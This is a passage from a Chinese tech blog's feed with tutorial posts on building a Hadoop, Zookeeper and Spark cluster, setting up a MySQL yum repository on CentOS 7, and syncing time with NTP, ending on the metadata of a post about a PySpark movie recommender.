</p></li></ol><p>slave1结点通过scp命令远程登录master结点，并复制master的公钥文件到当前的目录下，且重命名为<code>master_das.pub</code>，这一<br>过程需要密码验证。 </p><p>  scp master:~/.ssh/id_dsa.pub ./master_das.pub </p><p>将master结点的公钥文件追加至authorized_keys文件。 </p><p><code>cat master_dsa.pub &gt;&gt; authorized_keys</code><br>这时，master就可以连接slave1了。 </p><p>slave1结点首次连接时需要，“yes”确认连接，这意味着master结点连接slave1结点时需要人<br>工询问，无法自动连接，输入yes后成功接入，紧接着注销退出至master结点。 </p><p>同理slave2中也是这么操作。 </p><p>注意：两个结点的ssh免密码登录已经配置成功，还需要对主结点master也要进行上面的同<br>样工作，因为jobtracker有可能会分布在其它结点上，jobtracker有不存在master结点上的可能性。<br>在上一步骤中，我们已经进行过此操作，这里仅做提醒。 </p><h3 id="JDK简介及其安装"><a href="#JDK简介及其安装" class="headerlink" title="JDK简介及其安装"></a>JDK简介及其安装</h3><p>1.首先建立工作路径/usr/java<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /usr/java </span><br><span class="line">tar -zxvf /opt/soft/jdk-8u171-linux-x64.tar.gz -C /usr/java/</span><br></pre></td></tr></table></figure></p><p>2.修改环境变量 </p><p>修改环境变量：<code>vi /etc/profile</code> </p><p>添加内容如下： </p><pre><code>export JAVA_HOME=/usr/java/jdk1.8.0_171 export CLASSPATH=$JAVA_HOME/lib/ export PATH=$PATH:$ JAVA_HOME/bin export PATH JAVA_HOME CLASSPATH</code></pre><p>生效环境变量：<code>source /etc/profile</code><br>查看java版本：<code>java -version</code></p><p>同理slave节点，相同安装步骤。<br>注意：如果在slave节点中安装较慢，可以使用scp命令，将相同的文件从master中复制过来。<br>在master中将JDK复制到slave2中.</p><h3 id="Zookeeper简介"><a href="#Zookeeper简介" class="headerlink" title="Zookeeper简介"></a>Zookeeper简介</h3><h4 id="Zookeeper工作原理"><a href="#Zookeeper工作原理" class="headerlink" title="Zookeeper工作原理"></a>Zookeeper工作原理</h4><p>  ookeeper字面上理解就是动物管理员，Hadoop生态圈中很多开源项目使用动物命名，例如：Hive（蜜蜂）、Pig（小猪）。这就需要一个管理员来管理这些“动物”。在集群的管理中Zookeeper起到非常重要的角色负责分布式应用程<br>序协调的工作——它包含一个简单的原语集，分布式应用程序可以基于它实现同步服务，配置维护和命名服务等。 </p><p>Zookeeper服务自身组成一个集群(2n+1个服务允许n个失效)。Zookeeper服务有两个角色，一个是leader，负责写服务<br>和数据同步，剩下的是follower，提供读服务，leader失效后会在follower中重新选举新的leader。 </p><pre><code>1.客户端可以连接到每个server，每个server的数据完全相同。  2.每个follower都和leader有连接，接受leader的数据更新操作。 3.Server记录事务日志和快照到持久存储。  4.大多数server可用，整体服务就可用。 </code></pre><p>Zookeeper的核心是原子广播，这个机制保证了各个Server之间的同步。实现这个机制的协议叫做Zab协议。Zab协议有两种模式，它们分别是恢复模式（选主）和广播模式（同步）。当服务启动或者在领导者崩溃后，Zab就进入了恢复模式，当领导者被选举出来，且大多数Server完成了和Leader的状态同步以后，恢复模式就结束了。状态同步保证了Leader和Server具有相同的系统状态。 </p><p>为了保证事务的顺序一致性，Zookeeper采用了递增的事务ID号（zxid）来标识事务。所有的提议（proposal）都在被提出的时候加上了zxid。zxid是一个64位的数字，它高32位是epoch用来标识Leader关系是否改变，每次一个Leader被选出来，它都会有一个新的epoch，标识当前属于那个Leader的统治时期。低32位用于递增计数。 </p><p>每个Server在工作过程中有三种状态： </p><pre><code>LOOKING：当前Server不知道Leader是谁，正在搜寻； LEADING：当前Server即为选举出来的Leader； FOLLOWING：leader已经选举出来，当前Server与之同步。 </code></pre><p>Zookeeper的出现解决了这个问题。首先Zookeeper简化了一个选举算法，实现原子广播协议，简称Zab协议。举个例子：<br>一个Zookeeper集群有一个Leader，其他的都是Follower跟随者（或者Observer观察者），这个Leader是怎么选举出来的呢？一开始三台机器ABC，分别启动Zookeeper以后，发现没有Leader，就提议进行Leader选举，只要半数以上通过就算成功，过程为： </p><pre><code>A提案说，我要选自己，B你同意吗？C你同意吗？B说，我同意选A；C说，我同意选A。（注意，这里超过半数了，其实在现实世界选举已经成功了。但是计算机世界是很严格，另外要理解算法，要继续模拟下去。） 接着B提案说，我要选自己，A你同意吗；A说，我已经超半数同意当选，你的提案无效；C说，A已经超半数同意当选，B提案无效。 接着C提案说，我要选自己，A你同意吗；A说，我已经超半数同意当选，你的提案无效；B说，A已经超半数同意当选，C的提案无效。 选举已经产生了Leader，后面的都是Follower，只能服从Leader的命令。 </code></pre><h4 id="Zookeeper角色说明"><a href="#Zookeeper角色说明" class="headerlink" title="Zookeeper角色说明"></a>Zookeeper角色说明</h4><p>这个过程产生了leader后，Zookeeper就可以开始工作了，工作的过程中，理论上每个Zookeeper的数据都是一致的，如<br>果某一个节点出了问题，只要还有超过半数的节点正常，那整个集群就可以正常工作，所以Zookeeper首先实现了自己的高可用，然后Zookeeper还可以保存数据，协调控制数据。</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><ol><li><p>修改主机名称到IP地址映射配置。<br><code>vi /etc/hosts</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.15.104 master master.root </span><br><span class="line">192.168.15.127 slave1 slave1.root </span><br><span class="line">192.168.15.124 slave2 slave2.root</span><br></pre></td></tr></table></figure></li><li><p>修改ZooKeeper配置文件。在其中一台机器（master）上，用tar -zxvf命令</p></li></ol><p>解压缩<code>zookeeper-3.4.6.tar.gz</code><br>解压缩<code>zookeeper-3.4.6.tar.gz</code></p><ol start="3"><li>配置文件zoo.cfg </li></ol><p>进入zookeeper配置文件夹conf，将zoo_sample.cfg文件拷贝一份命名为zoo.cfg，Zookeeper在启动时会找这个文件作为默认配置文件。 </p><pre><code>cd /usr/zookeeper/zookeeper-3.4.10/conf/ scp zoo_sample.cfg zoo.cfg </code></pre><p>对zoo.cfg文件配置如下： </p><pre><code>tickTime=2000      #基本事件单元，以毫秒为单位。它用来指示心跳，最小的session过期时间为两倍的tickTime initLimit=10 syncLimit=5 dataDir=/usr/zookeeper/zookeeper-3.4.10/zkdata     #dataDir 为存储内存中数据库快照的位置，如果不设置参数，更新事务日志将被存储到默认位置。这里使用我们自己设定位置。 clientPort=2181 dataLogDir=/usr/zookeeper/zookeeper-3.4.10/zkdatalog    #指定zookeeper产生日志村放目录路径 server.1=master:2888:3888 server.2=slave1:2888:3888 server.3=slave2:2888:3888 </code></pre><p>server.A=B：C：D<br>A：是一个数字(机器重启默认从0开始)，表示这个是第几号服务器；<br>B：是这个服务器的ip地址，zookeeper是在hosts中映射了本机的IP，因此也可以写为服务器的映射名；<br>C：表示的是这个服务器与集群中的Leader服务器交换信息的端口；<br>D：表示的是万一集群中的Leader服务器挂了，需要一个端口来重新进行选举，选出一个新的Leader，<br>而这个端口就是用来执行选举时服务器相互通信的端口。<br>2888端口号是服务之间通信的端口，而3888是zookeeper与其他应用程序通信的端口。 </p><p>在zookeeper的目录中，创建配置中所需的zkdata和zkdatalog两个文件夹。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir zkdata </span><br><span class="line">mkdir zkdatalog</span><br></pre></td></tr></table></figure><ol start="5"><li>进入zkdata文件夹，创建文件myid，用于表示是几号服务器。master主机中，设置服务器id为1。 </li></ol><p>6.远程复制分发安装文件。<br>以上已经在主节点master上配置完成ZooKeeper，现在可以将该配置好的安装文件远程拷贝到集群中的各个结点对应的目录下（这时候子节点）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp -r /usr/zookeeper root@slave1:/usr/ </span><br><span class="line">scp -r /usr/zookeeper root@slave2:/usr/</span><br></pre></td></tr></table></figure><ol start="7"><li>设置myid。在我们配置的dataDir指定的目录下面，创建一个myid文件，里面内容为一个数字，用来<br>标识当前主机，conf/zoo.cfg文件中配置的server.X中X为什么数字，则myid文件中就输入这个数字。 </li></ol><p><code>cd /usr/zookeeper/zookeeper-3.4.10/zkdata</code></p><p>slave1中为2</p><p>slave2中为3</p><ol start="8"><li>修改/etc/profile文件，配置zookeeper环境变量。 </li></ol><p><code>vi /etc/profile</code></p><pre><code>#set zookeeper environment     export ZOOKEEPER_HOME=/usr/zookeeper/zookeeper-3.4.10  PATH=$PATH:$ZOOKEEPER_HOME/bin   </code></pre><ol start="9"><li>启动ZooKeeper集群。在ZooKeeper集群的每个结点上，执行启动ZooKeeper服务的脚本。注意在zookeeper目录下： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bin/zkServer.sh start </span><br><span class="line">bin/zkServer.sh status</span><br></pre></td></tr></table></figure></li></ol><p>通过上面状态查询结果可见，一个节点是Leader，其余的结点是Follower</p><p>至此，zookeeper安装成功</p><h2 id="Hadoop集群搭建"><a href="#Hadoop集群搭建" class="headerlink" title="Hadoop集群搭建"></a>Hadoop集群搭建</h2><h3 id="解压安装包"><a href="#解压安装包" class="headerlink" title="解压安装包"></a>解压安装包</h3><p>创建工作目录：<code>mkdir –p /usr/hadoop</code></p><p>解压<code>hadoop：tar -zxvf /opt/soft/hadoop-2.7.3.tar.gz -C /usr/hadoop/</code></p><h3 id="配置Hadoop环境变量"><a href="#配置Hadoop环境变量" class="headerlink" title="配置Hadoop环境变量"></a>配置Hadoop环境变量</h3><p>修改/etc/profile文件 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#HADOOP </span><br><span class="line">export HADOOP_HOME=/usr/hadoop/hadoop-2.7.3 </span><br><span class="line">export CLASSPATH=$CLASSPATH:$HADOOP_HOME/lib </span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/bin</span><br></pre></td></tr></table></figure><p>生效配置文件：<code>source /etc/profile</code></p><h3 id="Hadoop各组件"><a href="#Hadoop各组件" class="headerlink" title="Hadoop各组件"></a>Hadoop各组件</h3><p>hadoop的各个组件的都是使用XML进行配置，这些文件存放在hadoop的etc/hadoop目录下。 </p><pre><code>Common组件  core-site.xml HDFS组件  hdfs-site.xml MapReduce组件  mapred-site.xml YARN组件  yarn-site.xml </code></pre><h4 id="hadoop-env-sh"><a href="#hadoop-env-sh" class="headerlink" title="hadoop-env.sh"></a>hadoop-env.sh</h4><p>修改java环境变量： </p><p><code>export JAVA_HOME=/usr/java/jdk1.8.0_171</code> </p><h4 id="core-site-xml"><a href="#core-site-xml" class="headerlink" title="core-site.xml"></a>core-site.xml</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.tmp.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>/root/hadoop/tmp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>Abase for other temporary directories.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.default.name<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://master:9000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="yarn-site-xml"><a href="#yarn-site-xml" class="headerlink" title="yarn-site.xml"></a>yarn-site.xml</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Site specific YARN configuration properties --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.hostname<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>master<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>The address of the applications manager interface in the RM.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>$&#123;yarn.resourcemanager.hostname&#125;:8032<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>The address of the scheduler interface.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.scheduler.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>$&#123;yarn.resourcemanager.hostname&#125;:8030<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>The http address of the RM web application.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.webapp.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>$&#123;yarn.resourcemanager.hostname&#125;:8088<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>The https adddress of the RM web application.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.webapp.https.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>$&#123;yarn.resourcemanager.hostname&#125;:8090<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.resource-tracker.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>$&#123;yarn.resourcemanager.hostname&#125;:8031<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>The address of the RM admin interface.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.admin.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>$&#123;yarn.resourcemanager.hostname&#125;:8033<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>mapreduce_shuffle<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.maximum-allocation-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>2048<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">discription</span>&gt;</span>每个节点可用内存,单位MB,默认8182MB<span class="tag">&lt;/<span class="name">discription</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.vmem-pmem-ratio<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>2.1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.resource.memory-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>2048<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.vmem-check-enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="设置节点文件"><a href="#设置节点文件" class="headerlink" title="设置节点文件"></a>设置节点文件</h4><p>编写slave文件,添加子节点slave1和slave2 </p><p>编写master文件，添加主节点master </p><h4 id="分发hadoop"><a href="#分发hadoop" class="headerlink" title="分发hadoop"></a>分发hadoop</h4><pre><code>scp -r /usr/hadoop root@slave1:/usr/ scp -r /usr/hadoop root@slave2:/usr/</code></pre><h4 id="格式化HDFS"><a href="#格式化HDFS" class="headerlink" title="格式化HDFS"></a>格式化HDFS</h4><p>格式化<code>namenode：hadoop namenode -format</code></p><h2 id="安装Scala"><a href="#安装Scala" class="headerlink" title="安装Scala"></a>安装Scala</h2><p>我们需要在拥有hadoop集群的所有节点中安装scala语言环境，因为spark的源代码为scala语言所编写，所以接下来我们进行安装scala。 </p><p>首先我们进入到本系统的<code>/opt/soft</code>路径下可以看到我们所提供的scala安装包，接下来我们在<code>/usr/</code>下创建scala文件夹，然后解压scala到我们所创建的scala工作路径中</p><p>解压scala的tar包</p><p>配置scala的环境变量</p><p>更新环境变量并查看版本号</p><p>发送至所有子节点</p><p><code>scp -r /usr/scala root@slave1:/usr/</code> </p><p><code>scp -r /usr/scala root@slave2:/usr/</code> </p><h2 id="安装Spark"><a href="#安装Spark" class="headerlink" title="安装Spark"></a>安装Spark</h2><p>解压spark的tar包： </p><p>首先我们进入到本系统的<code>/opt/soft</code>路径下可以看到我们所提供的spark安装包，接下来我们在<code>/usr/</code>下创建spark文件夹，然后解压spark到我们所创建的spark工作路径中</p><p>复制spark-env.sh模板 </p><p>我们需要将spark-env.sh.template复制为spark-env.sh，命令为：<code>cp spark-env.sh.template spark-env.sh</code>.</p><p>当复制出spark-env.sh文件后我们可以使用vim进行编译，</p><p>配置spark-env.sh文件 </p><p>添加以下内容</p><pre><code>export SPARK_MASTER_IP=master export SCALA_HOME=/usr/scala/scala-2.11.12 export SPARK_WORKER_MEMORY=8g export JAVA_HOME=/usr/java/jdk1.8.0_171 export HADOOP_HOME=/usr/hadoop/hadoop-2.7.3 export HADOOP_CONF_DIR=/usr/hadoop/hadoop-2.7.3/etc/hadoop </code></pre><p>配置spark从节点，修改slaves文件 </p><p>命令：<code>cp slaves.template.template slaves</code> </p><p>使用vim命令编辑 slaves</p><pre><code>slave1slave2</code></pre><p>配置spark环境变量 </p><pre><code>export SPARK_HOME=/usr/spark/spark-2.4.0-bin-hadoop2.7 export PATH=$SPARK_HOME/bin:$PATH </code></pre><p>发送配置好的spark安装包到子节点 </p><p><code>scp -r /usr/spark root@slave1:/usr/</code><br><code>scp -r /usr/spark root@slave2:/usr/</code></p><p>修改slave1和slave2的环境变量</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;实验环境&quot;&gt;&lt;a href=&quot;#实验环境&quot; class=&quot;headerlink&quot; title=&quot;实验环境:&quot;&gt;&lt;/a&gt;实验环境:&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="Hadoop" scheme="https://plutoacharon.github.io/categories/Hadoop/"/>
    
    
      <category term="Hadoop" scheme="https://plutoacharon.github.io/tags/Hadoop/"/>
    
  </entry>
  
  <entry>
    <title>Centos7配置yum源安装Mysql</title>
    <link href="https://plutoacharon.github.io/2019/10/14/Centos7%E9%85%8D%E7%BD%AEyum%E6%BA%90%E5%AE%89%E8%A3%85Mysql/"/>
    <id>https://plutoacharon.github.io/2019/10/14/Centos7配置yum源安装Mysql/</id>
    <published>2019-10-14T10:47:10.000Z</published>
    <updated>2019-10-14T10:47:32.154Z</updated>
    
    <content type="html"><![CDATA[<h2 id="构建下载仓库"><a href="#构建下载仓库" class="headerlink" title="构建下载仓库"></a>构建下载仓库</h2><p>在<code>/etc/yum.repos.d/</code>下新建<code>mysql-community.repo</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[mysql57-community]</span><br><span class="line">name=MySQL 5.7 Community Server</span><br><span class="line">baseurl=https://repo.mysql.com/yum/mysql-5.7-community/el/7/$basearch/</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql</span><br></pre></td></tr></table></figure><h2 id="安装MySQL服务器"><a href="#安装MySQL服务器" class="headerlink" title="安装MySQL服务器"></a>安装MySQL服务器</h2><p><code>yum -y install mysql-server</code></p><h2 id="启动MySQL服务"><a href="#启动MySQL服务" class="headerlink" title="启动MySQL服务"></a>启动MySQL服务</h2><p><code>systemctl start mysqld.service</code></p><p>运行一下命令查看一下运行状态</p><p><code>systemctl status mysqld.service</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;构建下载仓库&quot;&gt;&lt;a href=&quot;#构建下载仓库&quot; class=&quot;headerlink&quot; title=&quot;构建下载仓库&quot;&gt;&lt;/a&gt;构建下载仓库&lt;/h2&gt;&lt;p&gt;在&lt;code&gt;/etc/yum.repos.d/&lt;/code&gt;下新建&lt;code&gt;mysql-communit
      
    
    </summary>
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/categories/Liunx/"/>
    
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/tags/Liunx/"/>
    
  </entry>
  
  <entry>
    <title>Centos7配置时间同步</title>
    <link href="https://plutoacharon.github.io/2019/10/14/Centos7%E9%85%8D%E7%BD%AE%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5/"/>
    <id>https://plutoacharon.github.io/2019/10/14/Centos7配置时间同步/</id>
    <published>2019-10-14T10:46:08.000Z</published>
    <updated>2019-10-14T10:46:46.689Z</updated>
    
    <content type="html"><![CDATA[<h2 id="时间同步"><a href="#时间同步" class="headerlink" title="时间同步"></a>时间同步</h2><p>1.时区一致。要保证设置主机时间准确，每台机器时区必须一致。实验中我们需要同步网络时间， </p><p>因此要首先选择一样的时区。先确保时区一样，否则同步以后时间也是有时区差。 </p><p>可以使用date查看自己的机器时间 </p><p>2.选择时区：tzselect </p><p>由于hadoop集群对时间要求很高，所以集群内主机要经常同步。我们使用ntp进行时间同步，master作为ntp服务器，其余的当做ntp客户端。 </p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfNTAwNjg1MzgzXzE1NzA4NjM5MDM1OTYvMA?x-oss-process=image/format,png" alt></p><h2 id="下载ntp"><a href="#下载ntp" class="headerlink" title="下载ntp"></a>下载ntp</h2><p><code>yum install –y ntp</code></p><p> NTP是网络时间协议(NetworkTimeProtocol)，它是用来同步网络中各个计算机的时间的协议。</p><ol start="3"><li>master作为ntp服务器，修改ntp配置文件。（master上执行）<br><code>vi /etc/ntp.conf</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">server  127.127.1.0    # local clock </span><br><span class="line">fudge   127.127.1.0   stratum 10    #stratum设置为其它值也是可以的，其范围为0~15</span><br></pre></td></tr></table></figure><p>重启ntp服务。 </p><p><code>/bin/systemctl restart  ntpd.service</code></p><ol start="4"><li>其他机器同步（slave1，slave2）<br>等待大概五分钟，再到其他机上同步该机器时间。<br><code>ntpdate  master</code></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;时间同步&quot;&gt;&lt;a href=&quot;#时间同步&quot; class=&quot;headerlink&quot; title=&quot;时间同步&quot;&gt;&lt;/a&gt;时间同步&lt;/h2&gt;&lt;p&gt;1.时区一致。要保证设置主机时间准确，每台机器时区必须一致。实验中我们需要同步网络时间， &lt;/p&gt;
&lt;p&gt;因此要首先选择一样
      
    
    </summary>
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/categories/Liunx/"/>
    
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/tags/Liunx/"/>
    
  </entry>
  
  <entry>
    <title>基于PySpark的电影推荐引擎</title>
    <link href="https://plutoacharon.github.io/2019/10/10/%E5%9F%BA%E4%BA%8EPySpark%E7%9A%84%E7%94%B5%E5%BD%B1%E6%8E%A8%E8%8D%90%E5%BC%95%E6%93%8E/"/>
    <id>https://plutoacharon.github.io/2019/10/10/基于PySpark的电影推荐引擎/</id>
    <published>2019-10-10T14:13:16.000Z</published>
    <updated>2019-10-10T14:19:54.125Z</updated>
    
